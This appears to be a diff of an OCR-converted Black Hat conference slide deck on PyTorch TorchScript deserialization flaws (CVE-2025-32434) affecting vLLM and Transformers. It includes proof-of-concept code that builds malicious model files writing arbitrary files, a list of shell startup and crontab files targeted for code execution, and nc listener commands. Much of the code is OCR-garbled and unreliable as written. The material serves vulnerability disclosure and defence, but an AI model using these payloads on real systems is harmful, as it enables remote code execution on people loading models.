 _builtin_ops.append((v,"aten::"+name))
-```
+\```
 
 - `Iterate through module attributes`
 
@@ -2125,22 +2110,22 @@ _builtin_ops.append((v,"aten::"+name))
 
 - `Register address and new name of the operator`
 
-```
+\```
 formodin_modules_containing_builtins:
 register_all(mod)
 ...
 forbuiltin,aten_opin_builtin_ops:
 _builtin_table[id(builtin)]=aten_op
-```
+\```
 
-```
+\```
 return_builtin_table
-```
+\```
 
-```
+\```
 def_find_builtin(fn):
 return_get_builtin_table().get(id(fn))
-```
+\```
 
 68
 
@@ -2150,12 +2135,12 @@ return_get_builtin_table().get(id(fn))
 
 ###### TorchScript Operators
 
-```
+\```
 #lazilybuilttoensurethecorrectinitializationorder
 def_get_builtin_table():
-```
+\```
 
-```
+\```
 ...
 defregister_all(mod):
 fornameindir(mod):
@@ -2165,46 +2150,46 @@ callable(v)
 andnot_is_special_functional_bound_op(v)
 ):
 _builtin_ops.append((v,"aten::"+name))
-```
+\```
 
-```
+\```
 formodin_modules_containing_builtins:
 register_all(mod)
 ...
 forbuiltin,aten_opin_builtin_ops:
 _builtin_table[id(builtin)]=aten_op
-```
+\```
 
-```
+\```
 std::shared_ptr<SugaredValue>toSugaredValue(
 py::objectobj,
 GraphFunction&m,
 constSourceRange&loc,
 boolis_constant){
-```
+\```
 
-```
+\```
 ...
 py::objectbuiltin_name=
 py::module::import("torch.jit._builtins").attr("_find_builtin")(obj);
 if(!builtin_name.is_none()){
 returnstd::make_shared<BuiltinFunction>(
 Symbol::fromQualString(py::str(builtin_name)),std::nullopt);
-```
+\```
 
-```
+\```
 }
 ...
-```
+\```
 
-```
+\```
 return_builtin_table
-```
+\```
 
-```
+\```
 def_find_builtin(fn):
 return_get_builtin_table().get(id(fn))
-```
+\```
 
 69
 
@@ -2214,49 +2199,49 @@ return_get_builtin_table().get(id(fn))
 
 ###### TorchScript Operators
 
-```
+\```
 #lazilybuilttoensurethecorrectinitializationorder
 def_get_builtin_table():
-```
+\```
 
-```
+\```
 ...
 defregister_all(mod):
-```
+\```
 
-```
+\```
 fornameindir(mod):
 v=getattr(mod,name)
 if(
 callable(v)
 andnot_is_special_functional_bound_op(v)
 ):
-```
+\```
 
-```
+\```
 _builtin_ops.append((v,"aten::"+name))
-```
+\```
 
-```
+\```
 formodin_modules_containing_builtins:
 register_all(mod)
 ...
-```
+\```
 
-```
+\```
 forbuiltin,aten_opin_builtin_ops:
 _builtin_table[id(builtin)]=aten_op
 return_builtin_table
-```
+\```
 
-```
+\```
 def_find_builtin(fn):
 return_get_builtin_table().get(id(fn))
-```
+\```
 
 ###### `emitBuiltinCall`
 
-```
+\```
 std::shared_ptr<SugaredValue>toSugaredValue(
 py::objectobj,
 GraphFunction&m,
@@ -2270,9 +2255,9 @@ returnstd::make_shared<BuiltinFunction>(
 Symbol::fromQualString(py::str(builtin_name)),std::nullopt);
 }
 ...
-```
+\```
 
-```
+\```
 std::shared_ptr<SugaredValue>emitApplyExpr(
 Apply&apply,
 size_tn_binders,
@@ -2284,7 +2269,7 @@ autoargs=getNamedValues(apply.inputs(),true);
 autokwargs=emitAttributes(apply.attributes());
 returnsv->call(loc,method,args,kwargs,n_binders);
 }
-```
+\```
 
 70
 
@@ -2294,12 +2279,12 @@ returnsv->call(loc,method,args,kwargs,n_binders);
 
 ###### TorchScript Operators
 
-```
+\```
 _modules_containing_builtins=(torch,torch._C._nn,torch._C._fft,
 torch._C._linalg,torch._C._nested,torch._C._sparse,torch._C._special)
-```
+\```
 
-```
+\```
 #lazilybuilttoensurethecorrectinitializationorder
 def_get_builtin_table():
 ...
@@ -2316,13 +2301,13 @@ register_all(mod)
 ...
 forbuiltin,aten_opin_builtin_ops:
 _builtin_table[id(builtin)]=aten_op
-```
+\```
 
-```
+\```
 aten::save=
-```
+\```
 
-```
+\```
 torch.save
 torch._C._nn.save
 torch._C._fft.save
@@ -2330,13 +2315,13 @@ torch._C._linalg.save
 torch._C._nested.save
 torch._C._sparse.save
 torch._C._special.save
-```
+\```
 
-```
+\```
 return_builtin_table
 def_find_builtin(fn):
 return_get_builtin_table().get(id(fn))
-```
+\```
 
 71
 
@@ -2346,24 +2331,24 @@ return_get_builtin_table().get(id(fn))
 
 ###### TorchScript Operators
 
-```
+\```
 We just need to call torch.saveor torch.from_fileto
 get arbitrary file read/write ability in TorchScript.
-```
+\```
 
-```
+\```
 @torch.jit.script
 defread_file(x:torch.Tensor):
 returntorch.from_file('/file/path',dtype=torch.long,size=100)
 #readthetensortrytogetactualword
-```
+\```
 
-```
+\```
 @torch.jit.script
 defwrite_file(x:torch.Tensor):
 returntorch.save("xxx","/file/path")
 #willwritedirtycharacters
-```
+\```
 
 72
 
@@ -2373,23 +2358,23 @@ returntorch.save("xxx","/file/path")
 
 ###### Write File to RCE
 
-```
+\```
 .zshrc
-```
+\```
 
-```
+\```
 .ssh/authorized_keys
 .cshrc
-```
+\```
 
-```
+\```
 .bashrc
-```
+\```
 
-```
+\```
 .config/fish/config.fish
 .profile
-```
+\```
 
 73
 
@@ -2399,9 +2384,9 @@ returntorch.save("xxx","/file/path")
 
 ###### Write File to RCE
 
-```
+\```
 centos crontabubuntu crontab
-```
+\```
 
 ###### 🧐 `Why ubuntu crontab failed?`
 
@@ -2415,11 +2400,11 @@ centos crontabubuntu crontab
 
 75 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 75/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 POC Video
-[root@iZjéch4zpf21z7bfea7y2nZ exp]#
 [root@iZjéch4zpf21z7bfea7y2nZ ~]# nc —lvn 8000)
 75
 ```
@@ -2436,15 +2421,14 @@ POC Video
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Heap Overflow
-root@iZjéc84h3p7hxdvzrrsn30Z:~/exp# 1s
 exp.py model.pt
 root@iZjéc84h3p7hxdvzrrsn30Z:~/exp# cat exp.py
 import_torch
-model=torch.load("model.pt",weights_only=True)
 model()
 root@iZjéc84h3p7hxdvzrrsn3@Z:~/exp# python3 exp.py
 /usr/local/1lib/python3.10/dist-packages/torch/_subclasses/functional_tensor.py:295: U
@@ -2455,18 +2439,6 @@ cpu = _conversion_method_template(device=torch.device("cpu") )
 rch.load' received a zip file that looks like a TorchScript archive dispatching to 't
 orch.jit.load' (call 'torch.jit.load' directly to silence this warning)
 warnings.warn(
-@x5@ @x31 Oxb O@xb Ox1 Ox7261765f6d726f6e Ox7265740035312e 8x31 @x5651e69427e0 Ox5651e
-6944848 @x5651e6945280 -O@x1lbada99b99bda9b6 Ox5f5FO06d Ox1b1 Ox5651e6a71e10 8x5651e693
-9cfO@ Ox13f Ox5651e69bd6e@ Ox5651e69bd6de Oxbfb Oxc8O Ox®@ Oxbfb Ox5651e69bd6e8 Oxdbe OB
-x5651e69448F8 @x400000001 0x5651e6952600 0x5651e6a43200 0x5651e6a43170 8x98 Ox9O Ox7Ff
-2b5328d7a8 0x100000000 @x119 Ox5651e69bd6e@ Ox5651e69bd6d@ Oxbf5 Oxc@@ Ox®@ Oxbf5 Ox56
-51e69bd6e@ Oxdc4 0x5651e6944988 @x400000002 8x5651e6952540 0x5651e6944890 @x5651e6952
-660 @x120 @x9@ Ox7f2b5328d7a8 Ox190000000 Ox10e Ox5651e69bd6e0 Ox5651e69bd6de@ Oxbd7 @
-xcQ@O@ Ox®@ Oxbd7 @x5651e69bd6e@ Oxde2 Ox5651e6944a18 0x400000002 Ox5651e696Ff1FO Ox5651e
-6944920 0x6f00746867696577 Ox1b@ @x4@ @x5651e6942700 @x5651e694bb08 Ox5651e694ab70 -O
-X2b807fO018aa7ef7 Ox® Ox@ Ox4O Ox31 Ox9 Ox9 OxO Ox73616364616F7262 @x5654838a0074 Ox31
-@x9 Ox9 Ox565100000000 O0x73616364616F7262 @x74 Ox31 0x5651e694a9Cc@ Ox@ Ox5651e694a9c
-@ @x®@ 0x5651e6944b00 0x31 Ox5 Ox5 Ox565100000000 Ox7972616e75 0x6574616501 @x61
 77
 ```
 
@@ -2476,27 +2448,17 @@ X2b807fO018aa7ef7 Ox® Ox@ Ox4O Ox31 Ox9 Ox9 OxO Ox73616364616F7262 @x5654838a00
 
 78 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-POC Video
-root@iZj6cit8ae25m7gcofépk4Z:~/exp# |p
-Toot@iZj6cit8ae25m7gcof6pk4Z:~# nc -lvnp 80
-Listening on 0.0.0.0 80
-78
-```
-
 ## Slide 79
 
 ###### This Is CVE-2025-32434!
 
 79 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 This Is CVE-2025-32434!
-JXKCVE-2025-32434 Detail
 Description
 PyTorch is a Python package that provides tensor computation with strong GPU acceleration and deep neural networks built on a tape-based
 autograd system. In version 2.5.1 and prior, a Remote Command Execution (RCE) vulnerability exists in PyTorch when loading a model using
@@ -2515,51 +2477,10 @@ A:N
 
 ## Slide 80
 
-###### Patch
-
-80
-
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
+https://github.com/pytorch/pytorch/pull/143326/files
 Patch
-1436
-1437
-1438
-1439
-1440
-1441
-+
-5 S@em8 torch/serialization.py (0
-1436
-1437
-1438
-1439
-1440
-1441
-1442
-1443
-1444
-1445
-1446
-@@ -1436,6 +1436,11 @@ def _get_wo_message(message: str) —> str:
-"silence this warning)",
-UserWarning,
-)
-if weights_only:
-raise RuntimeError(
-"Cannot use “*weights_only=True’* with TorchScript archives passed to "
-"**torch.load**. " + UNSAFE_MESSAGE
-)
-opened_file.seek(orig_position)
-return torch. jit. load(opened_file, map_location=map_location)
-if mmap:
-OvViewed () =>
 80
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 81
 
@@ -2575,17 +2496,6 @@ OvViewed () =>
 
 82 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-A Shaky Base, a Shaken Ecosystem
-- 4
-I. "taulla
-Vita
-LAVA
-82
-```
-
 ## Slide 83
 
 ###### Codes Using weights_only
@@ -2594,7 +2504,8 @@ LAVA
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Codes Using weights_only
@@ -2641,10 +2552,10 @@ Repositories 48 self.tts_model = StableTTS(len(symbols), self.mel_config.n_mels,
 
 85 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-(LLM
 Easy, fast, and cheap LLM serving for everyone
 | Documentation | Blog | Paper | Twitter/X | User Forum | Developer Slack |
 85
@@ -2658,7 +2569,8 @@ Easy, fast, and cheap LLM serving for everyone
 
 https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CVE-2025-24357
@@ -2679,7 +2591,6 @@ Availability High
 Impact
 Learn more about base metrics
 This vulnerability can be exploited to execute arbitrary codes and OS commands in the victim machine who fetch the pretrained
-CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
 repo remotely.
 Note that most models now use the safetensors format, which is not vulnerable to this issue. CVE ID
 CVE-2025-24357
@@ -2697,7 +2608,8 @@ https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54
 
 https://github.com/vllm-project/vllm/pull/12366
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Patch
@@ -2711,7 +2623,6 @@ Patch
 275
 276
 26
-2,
 28
 29
 vllm/assets/image. py (DO
@@ -2720,7 +2631,6 @@ image_path = get_vllm_public_assets(filename=f"{self.name}.pt",
 s3_prefix=VLM_IMAGES_DIR)
 return torch. load(image_path, map_location="cpu")
 return torch. load(image_path, map_location="cpu", weights_only=True)
-@ 3 mmm vllm/lora/models.py (OH
 273
 274
 275
@@ -2733,7 +2643,6 @@ embeddings = torch. load(new_embeddings_bin_file_path,
 map_location=device)
 map_location=device,
 weights_only=True)
-https://github.com/vilm-project/vllm/pull/12366
 87
 ```
 
@@ -2751,13 +2660,13 @@ https://github.com/vilm-project/vllm/pull/12366
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 One More Interesting Observation
 = ©) vilm-project / vilm
 <> Code ©) Issues 1.2k 3 Pullrequests 502 () Discussions ©) Actions © Security 2 |~ Insights
-PD & main ~ — vilm/requirements-cpu.txt (0
 npanpaliya [CPU][PPC] Updated torch, torchvision, torchaudio dependencies (#12555) Gp X
 Blame 15 lines (12 loc) + 689 Bytes
 1 # Common dependencies
@@ -2777,7 +2686,8 @@ Blame 15 lines (12 loc) + 689 Bytes
 
 90 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 & One More Interesting Observation
@@ -2787,14 +2697,12 @@ PD & main ~ — vilm/requirements-cuda.txt (2
 ») 35 people [Model] Refactoring of MiniCPM-V and add MiniCPM-o-2.6 support for vL.. Gm xX
 Blame 11 lines (10 loc) + 483 Bytes
 # Common dependencies
--r requirements—common. txt
 # Dependencies for NVIDIA GPUs
 ray[default] >= 2.9
 nvidia-ml-py >= 12.560.30 # for pynvml package
 torch == 2.5.1
 torchaudio==2.5.1 90
 #BHUSA @BlackHatEvents
-OoOnN OU FWDN
 ```
 
 ## Slide 91
@@ -2809,7 +2717,8 @@ OoOnN OU FWDN
 
 92 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Environment Setup
@@ -2835,14 +2744,12 @@ Obtaining dependency information for torchaudio==2.5.1 from
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 The Vulnerable Function
 10
-11
-Lz
-ABs
 14
 def pt_weights_iterator(
 hf_weights_files: List[str]
@@ -2871,7 +2778,8 @@ del state
 
 94 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 One Shot, One Kill?
@@ -2879,13 +2787,10 @@ import torch
 import torch.nn as nn from vllm.model_executor.model_loader import weight_utils
 class SimpleModel(nn.Module) : for i in weight_utils.pt_weights_iterator(['evil.bin']):
 def _ init__(self): print(i)
-super(SimpleModel, self). __init__()
 def forward(self):
 torch.save("test\n", "/tmp/1.txt")
-return torch. zeros(Q)
 2 model = SimpleModel()
 model_script = torch.jit.script(model) a aa
-model_script.save("evil.bin") TENA AS less WaetsenT
 ) -> Generator[Tuplel , torch.Tensor], None, None]:
 enable_tqdm = not torch.distributed.is_initialized(
 ) or torch.distributed.get_rank() == 0
@@ -2894,7 +2799,6 @@ hf_weights_files,
 ="Loading pt checkpoint st
 =not enable_tqdm,
 =_BAR_FORMAT,
-state = torch. load(bin_file,
 yield from state.items()
 del state
 ```
@@ -2913,7 +2817,8 @@ del state
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Previous PoC
@@ -2930,12 +2835,9 @@ import torch.nn as nn
 9
 super(SimpleModel, self).__init__() 1 import torch
 2 model = torch. load('evil.bin', weights_only=True)
-def _forward(self): 3
 torch.save("test\n", "/tmp/1.txt")
 10 return torch. zeros(Q) 4 model()
-11
 12 model = SimpleModel()
-13 model_script = torch. jit.script(model)
 14 model_script.save("evil.bin")
 96
 ```
@@ -2950,14 +2852,12 @@ torch.save("test\n", "/tmp/1.txt")
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-UkbWN
 10
-a1
 12
-rs
 14
 The Key to Failure
 def pt_weights_iterator(
@@ -2972,7 +2872,6 @@ desc="Loading pt checkpoint shards",
 disable=not enable_tqdm,
 bar_format=_BAR_FORMAT,
 state = torch. load(bin_file, map_location="cpu", weights_only=True)
-yield from state. items()
 del state
 “~ The model was not invoked
 97
@@ -3000,20 +2899,16 @@ del state
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 items()
-1 my dict = (*a': i, oe:
 2 for key, value in my_dict.items():
 3
-print(key, value)
 2,
 ‘er: 3}
 1 class dict(object):
-OAN OU BWHN
-PPPPRPRPR
-UBWNPF S&
 dict() -> new empty dictionary
 dict(mapping) -> new dictionary initialized from a mapping object's
 (key, value) pairs
@@ -3040,18 +2935,17 @@ pass
 
 102 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 First Attempt - Failed
 import torch
 import torch.nn as nn
 class SimpleModel(nn.Module):
-def init__(self):
 super(SimpleModel, self).__init__()
 def items(self):
 torch.save("test\n", "/tmp/1.txt")
-return torch. zeros(Q)
 model = SimpleModel()
 > model_script = torch.jit.script(model)
 model_script.save("evil.bin")
@@ -3065,7 +2959,8 @@ model_script.save("evil.bin")
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Second Attempt - Succeeded
@@ -3073,16 +2968,11 @@ import torch
 import torch.nn as nn
 class SimpleModel(nn.Module) :
 def __ init__(self):
-super(SimpleModel, self). __init__()
 def items(self):
 torch.save("test\n", "/tmp/1.txt")
-return torch. zeros(Q)
 def forward(self):
 self.items()
-return torch.zeros(Q)
 model = SimpleModel()
-model_script = torch. jit.script(model)
-model_script.save("evil.bin")
 (.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/vl_lm# ls /tmp/1.txt
 ls: cannot access '/tmp/1.txt': No such file or directory
 (.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/vl_lm# python3 exp.py
@@ -3093,9 +2983,6 @@ chive dispatching to 'torch.jit.load' (call 'torch.jit.load' directly to silence
 warnings.warn(
 Loading pt checkpoint shards: 100% Completed | 1/1 [00:00<00:00, 16.99it/s]
 (.venv) root@iZj6écit8a025m7gcofépk4Z:~/tmp_python_project/vl_lm# cat /tmp/1.txt
-archive/data.pklFBZZZZZZZZZZZZZZextest
-q.Py@8%4archive/versionFB0Z22Z2222Z22222222222Z22222222222222Z2222222Z22Z2Z22223
-PygU?archive/byteorderFB ; ZZZZZZZZ2222Z2ZZZ222222ZZZZZ22222Z2ZZZZ2222ZZZZZZ2Z2Z2Z2ZZZZZZZZZZ1LittlePe=@. archiv
 103
 ```
 
@@ -3142,22 +3029,20 @@ exported.append(name)
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Two Ways to Export Custom Functions
 1 class SimpleModel(nn.Module) : 1 class SimpleModel(nn.Module):
 l
 l
-2 def init__(self): Eo def init__(self):
-3 super(SimpleModel, self). __init__() 3 super(SimpleModel, self). __init__()
 5 @torch.jit.export 5 def items(self):
 6 def items(self): | 6 torch.save("test\n", "/tmp/1.txt")
 7 torch.save("test\n", "/tmp/1.txt") 7 return torch. zeros(Q)
 8 return torch. zeros(Q) 1 8
 9 ag def forward(self):
 10 def forward(self): 10 self.items()
-g Be return torch. zeros(Q) ! gba return torch. zeros(Q@)
 105
 ```
 
@@ -3171,7 +3056,8 @@ g Be return torch. zeros(Q) ! gba return torch. zeros(Q@)
 
 https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Report Our Finding
@@ -3192,7 +3078,6 @@ The fix applied to specify weights_only=True to calls to torch. load() did not s
 Availability High
 PyTorch has issued a new CVE about this problem: GHSA-53q9-r3pm-6pq6 Learn more about base metrics
 106
-httos://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
 ```
 
 ## Slide 107
@@ -3205,7 +3090,8 @@ httos://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
 
 https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Report Our Finding
@@ -3217,14 +3103,12 @@ Thanks for the report. This is interesting since PyTorch docs claim it's safe:
 https://github.com/pytorch/pytorch/security/policy
 torch.load with weights_only=True is also secure to our knowledge even though it offers significantly larger surface of
 attack.
-VesULIVUVI! cope uncnangea
 Confidentiality High
 GHSA-rh4j-5rhw-hr54 reported a vulnerability where loading a malicious model could result in code execution on the vilm host. Integrity High
 The fix applied to specify weights_only=True to calls to torch. load() did not solve the problem prior to PyTorch 2.6.0. aa :
 Availability High
 PyTorch has issued a new CVE about this problem: GHSA-53q9-r3pm-6pq6 Learn more about base metrics
 107
-httos://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
 ```
 
 ## Slide 108
@@ -3235,7 +3119,8 @@ httos://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Patch
@@ -3262,12 +3147,11 @@ Blame 28 lines (23 loc) -: 1.16 KB
 
 109 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ~. Transformers
-© Watch 1150 &? Fork 29.4k y yy Star 146k
-I wo
 (©) Transformers: the model-definition
 framework for state-of-the-art machine
 learning models in text, vision, audio,
@@ -3290,7 +3174,8 @@ https://github.com/huggingface/transformers/pull/27282/files
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Security Hardening
@@ -3298,16 +3183,12 @@ make torch.load a bit safer #27282
 File filter v
 & Merged
 Q Filter changed files
-vy ®&® src/transformers
 Ba} convert_pytorch_checkpoint...
 D modeling_flax_pytorch_utils....
 () modeling_tf_pytorch_utils.py
-() modeling_utils.py
-vy 0 models/wav2vec2
 B modeling_wav2vec2.py
 (} trainer.py
 dil] Changes from all commits v
-Hooda
 OO
 496
 497
@@ -3326,7 +3207,6 @@ OO
 510
 511
 512
-lsjale}
 514
 515
 516
@@ -3352,12 +3232,10 @@ lsjale}
 512
 513
 514
-p15)
 516
 517
 518
 519
-Conversations v fy v
 0/6 files viewed & Ask Copilot ~ Review in codespace
 src/transformers/modeling_utils.py oO O Viewec
 def load_state_dict(checkpoint_file: Union[str, os.PathLike] ):
@@ -3393,7 +3271,8 @@ https://github.com/huggingface/transformers/pull/27282/files #BHUSA @BlackHatEve
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Environment Setup
@@ -3429,7 +3308,8 @@ packaging>=20.0 in /root/tmp_python_project/.venv/lib/python3.10/sit
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Usage Example
@@ -3452,7 +3332,8 @@ colate chips. if you want to make 2 cakes, how much sugar do you need? To make 2
 
 113 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Demo Repo
@@ -3463,12 +3344,10 @@ pipeline = pipeline( ="text-generation",
 README.md
 config.json
 pytorch_model.bin
-B mainy demo. config.json ©
 8 azraelxuemo Update config.json = pytorch_modellbin x
 . 7 Users > xuemo > Downloads > = pytorch_model.bin
 <P> raw ‘OD Copydownloadlink © history 123
 "model_type": "bert"
-$
 113
 ```
 
@@ -3478,29 +3357,21 @@ $
 
 114 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Ultimately Calls torch.load
-™@ modeling_utils.py @ exp.py
 def load_state_dict(
 DE
 extra_args = {"mmap": True}
-return torch. load(
 checkpoint_file,
 =map_location,
 =weights_only,
-*kextra_args,
 Debug © exp (1)
 G ay Threads & Variables Console
 MainThread
-O) load_state_dict, modeling_utils.py:556 eo
-(a)
-(a)
 Oo
-Oo
-Oo
-(a)
 checkpoint_file = {str} '/root/.cache/huggingface/hub/models--azraelxuemo--demo/snapshots/96e4f0c3f2fed4dfb6a2dde5de56a9... View
 8 extra_args = o
 o1 is_quantized = False
@@ -3517,7 +3388,8 @@ Ol <module>, exp.py:2
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 implementation
@@ -3541,7 +3413,6 @@ is_safetensors_available():
 15 state_dict[k] = f.get_tensor(k)
 16 return state_dict
 17 try:
-18 ieee
 19 return torch. load(
 20 checkpoint_file,
 21 map_location=map_location,
@@ -3559,7 +3430,8 @@ is_safetensors_available():
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 keys()
@@ -3571,7 +3443,6 @@ elif state_dict is not None:
 original_checkpoint_keys (state_dict.keys())
 else:
 original_checkpoint_keys (
-load_state_dict(checkpoint_files[0], ="meta", =weights_only)|.keys()
 116
 ```
 
@@ -3583,7 +3454,8 @@ load_state_dict(checkpoint_files[0], ="meta", =weights_only)|.keys()
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Local Repo
@@ -3594,24 +3466,19 @@ Local Repo
 5 def
 def
 10
-Ld
 12 def
 13
 14
 15
 16 model =
 __init__(self):
-super(SimpleModel, self). _init__()
 keys(self):
 torch.save("test\n", "/tmp/1.txt")
-return torch. zeros(Q)
 forward(self):
 self.keys()
 return torch.zeros(Q)
 Simp leModeL( )
 17 model_script = torch.jit.script(model)
-18 model_script.save("demo/pytorch_model. bin")
-v (demo
 {} config.json
 pytorch_model.bin
 117
@@ -3623,7 +3490,8 @@ pytorch_model.bin
 
 118 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Exploit
